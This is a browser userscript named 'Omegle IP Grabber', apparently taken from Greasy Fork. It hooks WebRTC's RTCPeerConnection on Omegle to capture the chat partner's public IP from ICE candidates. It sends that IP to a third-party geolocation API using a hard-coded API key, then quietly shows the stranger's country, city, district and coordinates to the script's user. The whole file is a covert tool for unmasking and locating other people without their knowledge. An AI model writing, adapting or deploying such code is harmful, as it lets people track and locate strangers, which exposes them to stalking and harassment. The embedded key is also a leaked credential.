// ==UserScript==
// @name Omegle IP Grabber
// @description Print Strangers IP to Chat (Stranger can't see it)
// @author pTux
// @match *://*.omegle.com/*
// @icon https://external-content.duckduckgo.com/iu/?u=http%3A%2F%2Fwww.tippingpointlabs.com%2Fwp-content%2Fuploads%2F2009%2F05%2FOmegle-Logo-1024x1024.png
// @namespace https://greasyfork.org/en/scripts/443911-omegle-ip-grabber
// @version 1.0.0.0
// @downloadURL https://update.greasyfork.org/scripts/443911/Omegle%20IP%20Grabber.user.js
// @updateURL https://update.greasyfork.org/scripts/443911/Omegle%20IP%20Grabber.meta.js
// ==/UserScript==

(function () {
    'use strict';

    document.onload = function(){

    let apiKey = "8105e82fc1f54be58bc80353da10cf67";

    window.oRTCPeerConnection =
        window.oRTCPeerConnection || window.RTCPeerConnection;

    window.RTCPeerConnection = function (...args) {
        const pc = new window.oRTCPeerConnection(...args);

        pc.oaddIceCandidate = pc.addIceCandidate;

        pc.addIceCandidate = function (iceCandidate, ...rest) {
            const fields = iceCandidate.candidate.split(" ");
            const ip = fields[4];
            if (fields[7] === "srflx") {
                getLocation(ip);
            }
            return pc.oaddIceCandidate(iceCandidate, ...rest);
        };
        return pc;
    };

    let getLocation = async (ip) => {
        let url = `https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ip}`;

        await fetch(url).then((response) =>
            response.json().then((json) => {
                if (!document.getElementById('info')) {
                    const output = `---------------------\nIP:${json.ip}\nCountry: ${json.country_name}\nState: ${json.state_prov}\nCity: ${json.city}\nDistrict: ${json.district}\nLat / Long: (${json.latitude}, ${json.longitude})\n---------------------`;
                    console.log(output);

                    const info = [
                        `IP: ${json.ip}`,
                        `Country: ${json.country_name}`,
                        `State / Province: ${json.state_prov}`,
                        `City: ${json.city}`,
                        `District: ${json.district}`,
                        `Lat / Long: ${json.latitude}, ${json.longitude}`
                    ]

                    for (let i = 0; i < info.length; i++) {
                        let lb = document.createElement('p');
                        lb.id = 'info';
                        lb.innerHTML = info[i];

                        document.querySelector('.logbox').firstChild.appendChild(lb)
                    }
                }
            })
        );
    };

    }
})();